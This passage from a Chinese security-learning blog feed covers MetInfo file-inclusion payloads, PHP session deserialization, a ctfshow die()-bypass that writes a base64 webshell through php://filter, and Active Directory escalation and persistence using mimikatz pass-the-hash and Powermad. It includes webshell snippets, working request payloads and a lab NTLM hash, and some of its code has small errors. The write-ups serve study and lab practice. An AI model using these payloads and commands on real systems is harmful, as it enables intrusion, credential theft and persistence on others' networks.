class="string">&#x27;../404.html&#x27;</span>);<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$module</span> = <span class="variable">$modulefname</span>[<span class="variable">$mdle</span>][<span class="variable">$mdtp</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$mdle</span>==<span class="number">8</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$id</span>)<span class="variable">$id</span>=<span class="variable">$class1</span>;</span><br><span class="line">	<span class="variable">$module</span> = <span class="string">&#x27;../feedback/index.php&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到在代码中，存在$module，对文件进行了包含，并且在整个php文件中存在多处if于exit()通过审计可知，绕过payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?fmodule=<span class="number">7</span>&amp;module=./<span class="number">123</span>.txt <span class="comment">#于include目录提前准备好了一个123.txt</span></span><br></pre></td></tr></table></figure>

<p>跟踪包含/include/module的文件，发现利用点文件:<code>/about/index.php</code></p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211027124207361.png" alt="image-20211027124207361"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># MetInfo Enterprise Content Management System </span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. </span></span><br><span class="line"><span class="variable">$filpy</span> = basename(dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="variable">$fmodule</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;../include/module.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="variable">$module</span>;</span><br><span class="line"><span class="comment"># This program is an open source system, commercial use, please consciously to purchase commercial license.</span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?fmodule=<span class="number">7</span>&amp;module=../<span class="keyword">include</span>/<span class="number">123</span>.txt</span><br></pre></td></tr></table></figure>



<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211027124459419.png" alt="image-20211027124459419"></p>
<p>至此，成功包含文件执行，可配合日志文件写shell或文件上传图片马getshell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$b = $_GET[&#x27;whoami&#x27;];</span><br><span class="line">$b = system($B);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>php代码审计学习-5</title>
    <url>/2021/10/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5/</url>
    <content><![CDATA[<h3 id="PHP-session反序列化"><a href="#PHP-session反序列化" class="headerlink" title="PHP session反序列化"></a>PHP session反序列化</h3><p>本文转自先知社区的panda师傅所写文章<a href="https://xz.aliyun.com/t/6640#toc-1">带你走进PHP session反序列化漏洞</a></p>
<h4 id="PHP-Session的工作流程"><a href="#PHP-Session的工作流程" class="headerlink" title="PHP Session的工作流程"></a>PHP Session的工作流程</h4><p>当开始一个会话时，php会尝试在请求中查找<code>SessionID</code> （通常通过会话cookie），如果发现请求的Cookies，Get、Post中并不存在<code>session id</code>时，php便会自动调用<code>php_session_create_id</code>函数创建一个新的会话，并且通过http response的set-cookie头发送给客户端进行保存。</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029103800930.png" alt="image-20211029103800930"></p>
<p>当会话开始后，PHP便会将会话中的数据设置到<code>$_SESSION</code>变量中，下为在一个<code>$_SESSION</code>变量中注册变量的例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="string">&#x27;Nayon&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>当PHP脚本文件运行完成后，PHP会自动读取<code>$_SESSION</code>中的内容，并且将其序列化，然后发送给会话管理器来进行保存。</p>
<p>默认情况中，PHP来使用内置的文件会话保存管理器来完成对<code>session</code>的保存，也可以通过配置项<code>session.save_header</code>来修改要采用的会话保存管理器。对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置</p>
<p>整个流程如上所属，也可参照下方流程图：</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029104343511.png" alt="image-20211029104343511"></p>
<p>​    </p>
<p>php session存储默认是以文件方式进行存储，并且存储的文件是由<code>sess_sessionid</code>的格式进行存储的</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029104605529.png" alt="image-20211029104605529"></p>
<p>并且其中内容为session值序列化后的内容:</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029104656890.png" alt="image-20211029104656890"></p>
<p>session.serialize_header定义的引擎共有三种，如下表所示:</p>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>经过serialize()函数序列化处理的<strong>数组</strong></td>
</tr>
</tbody></table>
<h3 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h3><h4 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h4><p><code>session.serialize_header</code>默认省略使用php处理器</p>
<p>demo1：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_header&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029105204806.png" alt="image-20211029105204806"></p>
<p>序列化格式为:键名|由序列化处理后的值 : username|s:5:admin</p>
<h4 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h4><p>当<code>int_set(&#39;session_serialize_header&#39;,&#39;php_binary&#39;)</code>时页面文件使用php_binary序列化格式存储session信息</p>
<p>demo2:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;sessionsessionsessionsessionsession&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029110308380.png" alt="image-20211029110308380"></p>
<p>此处键值长度为35,35对应的ASCII码为<code>#</code>，因此最终的结果便成了ascii吗将内容注释为空</p>
<h4 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h4><p>当<code>ini_set(&#39;session.serialize_header&#39;,&#39;php_serialize&#39;)</code>时</p>
<p>demo:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029111810927.png" alt="image-20211029111810927"></p>
<p>序列化后a:1表示$_session数组中存在一个元素，{}中为其参数名与值</p>
<h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h3><p>利用<code>ryat</code>师傅提出的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action =“ upload.php” method =“ POST” enctype =“ multipart / form-data”&gt;</span><br><span class="line">    &lt;input type =“ hidden” name =“ PHP_SESSION_UPLOAD_PROGRESS” value =“ ryat” /&gt;</span><br><span class="line">    &lt;input type =“ file” name =“ file” /&gt;</span><br><span class="line">    &lt;input type =“ submit” /&gt;</span><br><span class="line">&lt;/ form&gt;</span><br></pre></td></tr></table></figure>

<p>提交后，<code>$_SESSION</code>中的键值就会为$_SESSION[‘upload_progress_ryat’] 在会话上传过程中，将会话数据进行序列化/反序列化，序列化格式会由<code>php.ini</code>中的<code>session.serialize_hander</code>选项设置，由此可知，若在脚本文件中设置不同的serialize_handler，那么可以导致注入任意<code>session</code>数据。</p>
<p>上面的解释可能看起来有些绕，简单来说<code>php</code>处理器和<code>php_serialize</code>处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。</p>
<p>其威海店在于<code>session.serialize_handler=php_serialize</code>存储的字符可以引入| ,但当以<code>session.serialize_handler=php</code>格式取出<code>$_session</code>值时,<code>|</code>会被当做键值对的分隔符，造成键、值数目错误，会在特定的地方造成反序列化漏洞</p>
<p>demo：</p>
<p>利用session.php文件，用于传入session值，文件内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其session内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;session&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>其另一个class.php文件如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">  ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">  session_start();</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Class1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Who are you?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$str</span> = <span class="keyword">new</span> test();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>此处运行实例化后，输出test</p>
<p><code>session.php</code> 文件的处理器是<code>php_serialize</code>，<code>class.php</code>文件的处理器是<code>php</code>，<code>session.php</code>文件的作用是传入可控的session值，class.php文件的作用是在对象unserialize()之前进行调用输出<code>who are you</code>，反序列化结束后，输出name值</p>
<p>这两个文件想要利用反序列化session漏洞，我们需要在session.php文件传入<code>|</code>与<code>序列化格式的值</code>，然后再次访问class.php时，就会调用session值，以php处理器的格式取出session，从而引发反序列化漏洞。</p>
<p>首先生成序列化字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="comment">//触发反序列化时，调用__wakeup()打印输出字符串</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;who are you&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//对象运行完成，打印name值</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="keyword">$this</span>-&gt;<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//新建实例str</span></span><br><span class="line"><span class="variable">$str</span> = <span class="keyword">new</span> Class2();</span><br><span class="line"><span class="comment">//对实例name赋值</span></span><br><span class="line"><span class="variable">$str</span>-&gt;name=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="comment">//序列化对象</span></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure>

<p>拿到payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Class1&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029123051359.png" alt="image-20211029123051359"></p>
<p>将其传入index.php</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>利用机器账户进行域提权</title>
    <url>/2022/02/19/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<p>pass the hash攻击，除去常见的使用本地管理员账户进行hash传递外，还可以使用机器账户进行提权。</p>
<p>如果在主机上授予了本地管理员访问权限，并且计算机本身为<code>Domain admins</code>组的成员，那我们在进行渗透测试时，可以利用该计算机账户进行提权。以机器账户来使用hash传递来进行提权。</p>
<span id="more"></span>

<p><strong>环境模拟：</strong></p>
<p>WIN2016.attack.local 10.10.10.128 主机在Domain admins组下</p>
<p>已经获得WIN2016机器的本地管理员权限</p>
<h4 id="识别计算机账户所在组"><a href="#识别计算机账户所在组" class="headerlink" title="识别计算机账户所在组"></a>识别计算机账户所在组</h4><h5 id="Active-Directory模块查找可用计算机账户"><a href="#Active-Directory模块查找可用计算机账户" class="headerlink" title="Active Directory模块查找可用计算机账户"></a>Active Directory模块查找可用计算机账户</h5><p>利用Powershell中的Active Directory模块来识别当前计算机所在组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ADComputer -Filter * -Properties MemberOf | ? &#123;$_.MemberOf&#125;</span><br></pre></td></tr></table></figure>

<p>不过很遗憾，我在普通权限下的域主机中，未能通过此命令查找到任何可用计算机账户，即使我已经在前一步将本机的计算机账户添加进高权限组内也未能查找到任何有效信息，唯有在域控机下才查找到了结果。</p>
<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E6%8F%90%E6%9D%83.assets/image-20220219232329157.png" alt="image-20220219232329157"></p>
<p>但很显然，在域管机器下可查找在当前我们所需要的条件下根本就不现实，因此我们可以选择另一个方法进行信息收集，查找可用主机账户进行提权。</p>
<h5 id="net-group查找"><a href="#net-group查找" class="headerlink" title="net group查找"></a>net group查找</h5><p>利用net group 查找敏感组内是否存在可用机器账户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E6%8F%90%E6%9D%83.assets/image-20220219232657449.png" alt="image-20220219232657449"></p>
<h5 id="导出WIN2016-账户的NTLM-hash"><a href="#导出WIN2016-账户的NTLM-hash" class="headerlink" title="导出WIN2016$账户的NTLM hash"></a>导出WIN2016$账户的NTLM hash</h5><p>利用mimikatz模块导出WIN2016$账户的NTLM hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::msv</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E6%8F%90%E6%9D%83.assets/image-20220219233211803.png" alt="image-20220219233211803"></p>
<h5 id="以WIN2016-账户进行pth"><a href="#以WIN2016-账户进行pth" class="headerlink" title="以WIN2016$账户进行pth"></a>以WIN2016$账户进行pth</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:WIN2016$ /ntlm:56c1672b5bb172505748aade48865c07 /domain:attack.local</span><br></pre></td></tr></table></figure>

<p>可以看到，在pth攻击前，我们无法访问dc的共享目录</p>
<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E6%8F%90%E6%9D%83.assets/image-20220219233443844.png" alt="image-20220219233443844"></p>
<p>执行后</p>
<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E6%8F%90%E6%9D%83.assets/image-20220219233502296.png" alt="image-20220219233502296"></p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>利用php伪协议绕过die()</title>
    <url>/2021/10/31/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die/</url>
    <content><![CDATA[<p>file_put_content写入文件遇到exit() 、die() 情况分类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$contnet</span>)</span><br><span class="line">file_put_contents(<span class="variable">$content</span>,<span class="string">&quot;&lt;?php die()&quot;</span>.<span class="variable">$contnet</span>);</span><br><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="variable">$contnet</span>.<span class="string">&#x27;\nxxxxxx&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>此处我们可以利用php://filter协议，将文件内容中的die或exit解码掉，以便执行后方的其他语句。</p>
<p><strong>文件名、内容皆可控</strong></p>
<p><strong>base64编码绕过</strong></p>
<p>利用base64编码解码，将exit die解码为乱码，将恶意代码解码还原。</p>
<p><img src="/images/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die.assets/image-20211031110309150.png" alt="image-20211031110309150"></p>
<span id="more"></span>

<p><strong>2、rot13编码绕过</strong></p>
<p>原理与base64解码绕过一致，将die解码为不可识别语句，但此方法需要服务器未开启短标签功能，若开启，就会被解析，后方的代码便会报错失去效果。</p>
<p>本地环境报错。</p>
<p><img src="/images/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die.assets/image-20211031110649789.png" alt="image-20211031110649789"></p>
<p><strong>过滤器编码套娃使用</strong></p>
<p>利用过滤器嵌套过滤器，使得写入的内容层层解密，最后写入我们预期的代码。</p>
<p><strong>strip_tags|base64-decode去除标签后解密base64</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?filename=php:<span class="comment">//filter/string.strip_tags|convert.base64-decode/resource=shell.php</span></span><br><span class="line">?contnet=<span class="meta">?&gt;</span>PD9waHAgcGhwaW5mbygpOyA/Pg==</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die.assets/image-20211031112033989.png" alt="image-20211031112033989"></p>
<p>但此方法在php7环境上会由于string.strip_tags的问题发生错误，从而导致无法写入shell，但在php5的环境下不会受此影响.</p>
<p>测试demo ctfshow web入门87：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $content = $_POST[&#x27;content&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处题目利用file_put_content写文件，并过滤了<code>php</code>、<code>data</code>等关键词，但由于存在urldecode函数，我们可以使用二次url编码绕过;内容处，于文件首写入die(),我们需要绕过die才可执行任意命令。</p>
<p>利用<code>php://filter/writ=convert.base64-decode/resource=shell.php</code> 伪协议将即将写入的内容base64解码，将<code>&lt;?php die(xxx);?&gt;</code>解码为无意义的乱码，使得php无法识别，再将base64编码后的<code>&lt;?php system($_POST[&#39;cmd&#39;]);?&gt;</code>写入以便执行系统命令。</p>
<p>需要注意的是，由于base64_decode识别机制类似于下方代码，只会识别64个可打印字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = preg_replace(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line">base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>而在<code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code>中，base64_decode会将其他字符略去，只对<code>php die</code>进行解码操作,同时，base64编码4位一组，需在恶意代码前添加两个字符用于解码，用于避免恶意代码解码错误。</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filespan><br><span class="line"></span><br><span class="line">POST:content=aaPD9waHAgcGhwaW5mbygpOyA/Pg==</span><br></pre></td></tr></table></figure>



<p><img src="/images/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die.assets/image-20211031105448496.png" alt="image-20211031105448496"></p>
<p>参考文章:</p>
<p><a href="https://xz.aliyun.com/t/8163#toc-3">https://xz.aliyun.com/t/8163#toc-3</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>利用机器账户进行域维权</title>
    <url>/2022/02/15/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>机器账户在许多技术中可以用于提权或横向移动，如使用机器账户的委派进行dcsyn了上述作用，使用机器账户也可进行维权操作。我们可以将任意计算机账户添加到高权限组(例如Domain Admin、Domain Controllers、Enterprise Admins) 或对计算机账户的userAccountControl属性进行修改。使用这两种方式，我们可以通过机器账户在域内进行身份认证（因为密码已知）并进行提权操作，例如Dcsync拖取域内hash。</p>
<p>除了上述作用，使用机器账户也可进行域维权操作。我们可以将任意计算机账户添加到高权限组(例如Domain Admin、Domain Controllers、Enterprise Admins) 或对计算机账户的<code>userAccountControl</code>属性进行修改。使用这两种方式，我们可以通过机器账户在域内进行身份认证（因为密码已知）并进行提权操作，例如Dcsync拖取域内hash。</p>
<span id="more"></span>

<h2 id="userAccountControl说明"><a href="#userAccountControl说明" class="headerlink" title="userAccountControl说明"></a>userAccountControl说明</h2><p>默认的情况下，域中的标准用户最多可以创建10个机器账户，这是由<strong>ms-DS-MachineAccountQuota</strong>进行设定的。我们可以使用Powermad等工具从加入域和未加入域的主机中进行添加账户操作。但为了让机器账户在域中显示为域控制器，我们还需要将<code>userAccountControl</code>属性设置为0x2000(SERVER_TRUST_ACCOUNT)的值。0x2000换算为十进制数字为8192.修改此属性需要域管理员级别的权限。下面我们从ADSI编辑器中进行修改，改为8192</p>
<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217123153176.png" alt="image-20220217123153176"></p>
<h2 id="PowerMad-Active-Directory组合"><a href="#PowerMad-Active-Directory组合" class="headerlink" title="PowerMad+Active Directory组合:"></a>PowerMad+Active Directory组合:</h2><h3 id="添加机器账户"><a href="#添加机器账户" class="headerlink" title="添加机器账户"></a>添加机器账户</h3><p>我们在进行维权时，可以从利用工具从命令行创建机器账户。例如Standln、SharpMad以及PowerMad等工具；下面展示如何利用PowerMad在域内添加一个机器账户。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount Nayon -Domain attack.local -DomainController dc.attack.local</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217123705198.png" alt="image-20220217123705198"></p>
<p>此时我们便添加机器账户成功了，利用如下命令查看:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217124450971.png" alt="image-20220217124450971"></p>
